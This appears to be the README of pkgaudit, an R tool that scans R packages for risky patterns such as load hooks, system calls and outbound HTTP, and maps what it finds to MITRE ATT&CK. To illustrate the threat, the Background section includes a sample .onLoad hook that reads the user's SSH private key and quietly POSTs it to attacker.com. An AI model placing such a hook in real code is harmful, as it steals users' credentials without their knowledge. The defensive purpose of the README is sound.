# pkgaudit

[![R-CMD-check](https://github.com/tylerjssmith/pkgaudit/actions/workflows/R-CMD-check.yaml/badge.svg)](https://github.com/tylerjssmith/pkgaudit/actions/workflows/R-CMD-check.yaml)
[![osv-scanner](https://github.com/tylerjssmith/pkgaudit/actions/workflows/osv-scanner.yaml/badge.svg)](https://github.com/tylerjssmith/pkgaudit/actions/workflows/osv-scanner.yaml)

pkgaudit provides static analysis security testing (SAST) for R packages. It searches R source code for security-relevant patterns warranting manual review and, if found, returns the results with a clear explanation of the pattern and its relationship to the [MITRE ATT&CK](https://attack.mitre.org/) framework of adversary tactics and techniques.

## Background

R is a statistical programming language widely used in environments processing sensitive data: clinical trial analyses, government statistics, financial risk modeling, academic research, and more. 

R packages are the primary mechanism for sharing R code. They are also potential attack vectors. When a user calls `install.packages()` or `library()`, for example, R automatically executes code in hooks like `.onLoad()` and `.onAttach()`. A malicious or compromised package can run arbitrary code on the user's system without any action beyond the normal R workflow.

A minimal example of what a malicious `.onLoad()` hook might look like is:

``` r
.onLoad <- function(libname, pkgname) {
  tryCatch({
    key <- paste(
      readLines("~/.ssh/id_rsa"), 
      collapse = "\n"
    )
    httr::POST(
      "https://attacker.com/collect",
      body = list(key = key)
    )
  }, error = function(e) invisible(NULL))
}
```

This code reads the user's SSH private key and sends it to an external server whenever the package is loaded. The `tryCatch()` wrapper suppresses any errors, so the package loads normally and the user sees nothing unusual.

This is not a theoretical risk. The same attack pattern has been documented repeatedly in ecosystems adjacent to R. In 2022, the Python package ctx on PyPI was compromised to exfiltrate environment variables — including cloud credentials — from data scientists' systems. In 2024, the Python package ultralytics, a widely used computer vision library, was compromised to distribute a cryptominer to its users.

R's use in environments handling sensitive data makes it an attractive target for a broad range of threat actors. The assets at risk include both the data processed in R sessions and the underlying systems on which R runs, which provide compute resources and credentials for lateral movement.

pkgaudit aims to provide one layer of defense against an underappreciated risk. A pkgaudit finding does not necessarily indicate malicious code, but prospective users should review flagged code prior to running it.

## Rule Coverage

v0.3.0 separates *where* code can run from *what* it does, using three rule classes:

- **File contexts** — files that R itself executes during build, check, or install (e.g. `configure`, `src/Makevars`, `src/install.libs.R`). Any occurrence is flagged for review.
- **Code contexts** — top-level code and lifecycle hooks (`.onLoad`, `.onAttach`, `.onUnload`, `.onDetach`, `.Last.lib`, `rlang::on_load`) whose bodies run automatically when a namespace is loaded, attached, unloaded, or detached.
- **Patterns** — security-relevant calls. Each pattern finding is attributed to the code context it executes in, so a `system()` call inside `.onLoad` (runs on `library()`) is distinguished from one inside an ordinary function (`Other`) or at top level (`Top-level`).

| Class | Rules |
|---|---|
| File contexts | `configure`, `configure.win`, `configure.ucrt`, `configure.ac`, `configure.in`, `cleanup`, `cleanup.win`, `src/Makefile[.win/.ucrt]`, `src/GNUmakefile`, `src/Makevars[.in/.win/.ucrt]`, `src/install.libs.R` |
| Code contexts | `.onLoad`, `.onAttach`, `.onUnload`, `.onDetach`, `.Last.lib`, `rlang::on_load` |
| Patterns | `system()`/`system2()`/`shell()`, `eval(parse())`, `source()`, `download.file()`, `options(repos=)`, and outbound HTTP via `curl`, `httr`, `httr2`, `RCurl` |

Pattern rules carry [MITRE ATT&CK](https://attack.mitre.org/) technique labels. Qualified (`pkg::fn()`) and unqualified (`fn()`) call forms are both detected; assignments and `$`/`@` accessors are excluded. The rule definitions live under [inst/rules/](inst/rules/).

## Installation

You can install pkgaudit as follows:

``` r
remotes::install_github("tylerjssmith/pkgaudit")
```

## Database Integrity

pkgaudit detects patterns using a SQLite database of rules shipped with the package at `inst/db/rules.db`. To verify that your installed copy of the database has not been modified since publication, check its SHA-256 hash against the value published here:

``` r
digest::digest(
  system.file("db", "rules.db", package = "pkgaudit"),
  algo = "sha256",
  file = TRUE
)
```
Expected SHA-256: `c5bbc586c99d9845cc141b8b773238f95014700b68a5202c9cbcce813f79adbe`

The hash is regenerated automatically by `inst/scripts/build_db.R` whenever the database is rebuilt and should match the value above exactly. `load_rules()` verifies the database against its bundled `.sha256` sidecar on every call and refuses to load a modified database.

## Usage

A source package directory is scanned as follows:

``` r
library(pkgaudit)
rules  <- load_rules()
result <- audit_package("path/to/package", rules = rules)

result$file_contexts  # security-relevant files
result$code_contexts  # hooks / top-level code
result$patterns       # flagged calls, each with its code_context
result$errors         # any files or rules that could not be processed
result$metadata       # package name/version, SHA-256, rules version, scan time

# audit_package() returns a `pkgaudit` object with a print method that
# summarizes the scan metadata and finding counts:
print(result)
print(result, path = FALSE)   # omit the local Path: line from shared output
```

To audit a downloaded source tarball before installing it:

``` r
result <- audit_tarball("path/to/package_1.0.0.tar.gz")
```




